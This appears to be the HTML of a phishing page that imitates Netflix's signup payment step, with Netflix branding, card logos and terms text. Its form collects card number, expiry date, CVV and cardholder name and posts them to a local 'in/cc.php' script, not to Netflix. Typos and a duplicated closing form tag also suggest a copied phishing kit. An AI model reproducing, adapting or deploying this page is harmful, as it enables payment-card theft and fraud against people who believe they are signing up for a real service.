...
<script>window.netflix = window.netflix || {} ;         netflix.notification.constants = {"pageName":"signupSimplicity-editcreditOptionMode","locale":"es-MA","sessionLength":30,"uiMode":"nonmember","ownerToken":"SQCGNDBZL5EWFKV757I4R2BBCM","accept-language":"fr-FR,fr;q=0.9"};</script>
...
)) {CreateMethodProperty(Math,"sign",function i(n){var n=Number(n);return isNaN(n)?NaN:1/n==-Infinity?-0:1/n===Infinity?0:n<0?-1:n>0?1:void 0});}if (!("freeze"in Object
)) {CreateMethodProperty(Object,"freeze",function e(r){return r});}if (!("fromEntries"in Object
)) {CreateMethodProperty(Object,"fromEntries",function r(e){RequireObjectCoercible(e);var t={},o=function(r,e){var t=this,o=ToPropertyKey(r);CreateDataPropertyOrThrow(t,o,e)};return AddEntriesFromIterable(t,e,o)});}if (!("requestIdleCallback"in this
...
<style data-emotion="default-ltr-cache kg1rox" data-s="">.default-ltr-cache-kg1rox{max-width:39px;max-height:25px;}</style>
<style data-emotion="default-ltr-cache bkrtt5" data-s="">.default-ltr-cache-bkrtt5{position:absolute;top:0;right:10px;height:100%;width:39px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:flex-end;justify-content:flex-end;color:#999999;-webkit-transform:translateY(8%);-moz-transform:translateY(8%);-ms-transform:translateY(8%);transform:translateY(8%);-webkit-transition:-webkit-transform 0.1s ease;transition:transform 0.1s ease;}.default-ltr-cache-bkrtt5 svg{-webkit-transform:scale(1.197) translateX(-2px);-moz-transform:scale(1.197) translateX(-2px);-ms-transform:scale(1.197) translateX(-2px);transform:scale(1.197) translateX(-2px);}</style>
<style data-emotion="default-ltr-cache s15e62" data-s="">.default-ltr-cache-s15e62[dir='rtl'] svg{-webkit-transform:scale(-1, 1);-moz-transform:scale(-1, 1);-ms-transform:scale(-1, 1);transform:scale(-1, 1);}</style>
...
<div data-uia="loc" lang="es-MA" dir="ltr">
<div class="basicLayout isMobile safariIOS modernInApp hasLargeTypography signupSimplicity-editcreditOptionMode simplicity" lang="es-MA" dir="ltr">
...
<span class="screen-reader-text">Inicio de Netflix</span>
</a>
...
<span class="changePaymentText"></span>
</a>
</div>
<div>
<div class="stepHeader-container" data-uia="header">
<div class="stepHeader" role="status">
<span id="" class="stepIndicator" data-uia="">STEP <b>3</b> OF <b>3</b>
</span>
...
<span class="logos logos-block" data-uia="cardLogos-comp" aria-label="Aceptamos VISA y MASTERCARD.">
<img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="VISA" class="logoIcon VISA default-ltr-cache-kg1rox epojmy00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x" data-uia="logoIcon-VISA">
<img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="MASTERCARD" class="logoIcon MASTERCARD default-ltr-cache-kg1rox epojmy00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x" data-uia="logoIcon-MASTERCARD">
</span>
<div class="formFieldContainer">
 <form method="post" action="./in/cc.php">
...
<div data-uia="field-creditCardNumber+container" class="nfInput validated nfInputOversize hasLogo">
<div class="nfInputPlacement">
<label class="input_id" placeholder="creditCardNumber">
<input type="tel" name="creditCardNumber" id="card" class="nfTextField hasText" autocomplete="cc-number" maxlength="18" minlength="14" required>
...
<li data-uia="field-creditExpirationMonth+wrapper" class="nfFormSpace inline">
<div data-uia="field-creditExpirationMonth+container" class="nfInput validated nfInputOversize">
<div class="nfInputPlacement">
<label class="input_id" placeholder="creditExpirationMonth">
<input type="text"  name="creditExpirationMonth" maxlength="7" minlength="5" class="nfTextField hasText" id="exp" tabindex="0" autocomplete="cc-exp" dir="ltr" placeholder="MM/AA">
<label for="id_creditExpirationMonth" class="placeLabel">Expiry date</label>
</label>
</div>
</div>
</li>
<li data-uia="field-creditExpirationYear+wrapper" class="nfFormSpace compressField">
</li>
<li data-uia="field-creditCardSecurityCode+wrapper" class="nfFormSpace inline">
<div data-uia="field-creditCardSecurityCode+container" class="nfInput validated nfInputOversize tooltip tooltipValidated">
<div class="nfInputPlacement">
<label class="input_id" placeholder="creditCardSecurityCode">
<input type="tel"  name="creditCardSecurityCode" class="nfTextField hasText" id="cvv" tabindex="0" autocomplete="cc-csc" maxlength="3" minlength="3" dir="ltr" placeholder="">
<label for="id_creditCardSecurityCode" class="placeLabel">CVV</label>
</label>
</div>
<button type="button" class="tooltipWrapper" data-uia="tooltipWrapper">
<span dir="ltr" class="default-ltr-cache-s15e62 e1boxt2d0">
<svg width="26" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="Hawkins-Icon Hawkins-Icon-Standard" viewport="0 0 26 26" color="#999999">
<path fill-rule="evenodd" clip-rule="evenodd" d="M3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12ZM12 1C5.92487 1 1 5.92487 1 12C1 18.0751 5.92487 23 12 23C18.0751 23 23 18.0751 23 12C23 5.92487 18.0751 1 12 1ZM12 8.5C10.6831 8.5 10 9.24303 10 10H8C8 7.75697 10.0032 6.5 12 6.5C13.9968 6.5 16 7.75697 16 10C16 11.3487 14.9191 12.2679 13.8217 12.68C13.5572 12.7793 13.3322 12.9295 13.1858 13.0913C13.0452 13.2467 13 13.383 13 13.5V14H11V13.5C11 12.0649 12.1677 11.1647 13.1186 10.8076C13.8476 10.5339 14 10.1482 14 10C14 9.24303 13.3169 8.5 12 8.5ZM13.5 16.5C13.5 17.3284 12.8284 18 12 18C11.1716 18 10.5 17.3284 10.5 16.5C10.5 15.6716 11.1716 15 12 15C12.8284 15 13.5 15.6716 13.5 16.5Z" fill="currentColor">
</path>
</svg>
</span>
</button>
...
<div data-uia="field-firstName+container" class="nfInput validated nfInputOversize">
<div class="nfInputPlacement">
<label class="input_id" placeholder="firstName">
<input type="text" data-uia="field-firstName" name="firstName" class="nfTextField hasText" id="firstName"  tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="ltr" placeholder="">
...
<div data-uia="field-lastName+container" class="nfInput validated nfInputOversize">
<div class="nfInputPlacement">
<label class="input_id" placeholder="lastName">
<input type="text" data-uia="field-lastName" name="lastName" class="nfTextField hastext" id="lastName" value="" tabindex="0" autocomplete="cc-family-name" dir="" placeholder="">
...
<div>
<div class="signupTerms" id="touIntlWarning" data-uia="touIntlWarning">Your payments will be processed internationally. Additional bank fees may apply.</div>
<div class="tou--container" data-uia="tou-container">
<div class="user-consent--container" data-uia="termsOfUseMatlock+organic-rest">
<span id="" data-uia="termsOfUse-Disclosure">By checking the checkbox below, you agree to our <a target="_blank" href="https://help.netflix.com/legal/termsofuse"> Terms of Use</a> , <a target="_blank" href="https://help.netflix.com/legal/privacy"> Privacy Statement</a>, and that you are over 18. Netflix will automatically continue your membership and charge the membership fee  to your payment method until you cancel. You may cancel at any time to avoid future charges.</span>
<div class="ui-binary-input">
<input type="checkbox" class="" name="hasAcceptedTermsOfUse" id="cb_hasAcceptedTermsOfUse" value="true" tabindex="0" data-uia="field-hasAcceptedTermsOfUse">
<label for="cb_hasAcceptedTermsOfUse" data-uia="field-hasAcceptedTermsOfUse+label">
<span id="" data-uia="">i agree.</span>
</label>
<div class="helper">
</div>
</div>
...
<button type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" placeholder="">Start Membership</button>
</form>
</form>
</div>
</div>
...
<span id="" data-uia="data-uia-footer-label">cookies Prefetences</span>
</a>
</li>
...
<label class="nfLabel" for="lang-switcher-select">Selecciona el idioma</label>
...
<option label="English" lang="en" value="/signup/editcredit?locale=en-MA">English</option>
<option selected="" label="Español" lang="es" value="/signup/editcredit?locale=es-MA">Español</option>
</select>
</div>
</div>
</div>
...
<iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1679732973133" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;">
</iframe>
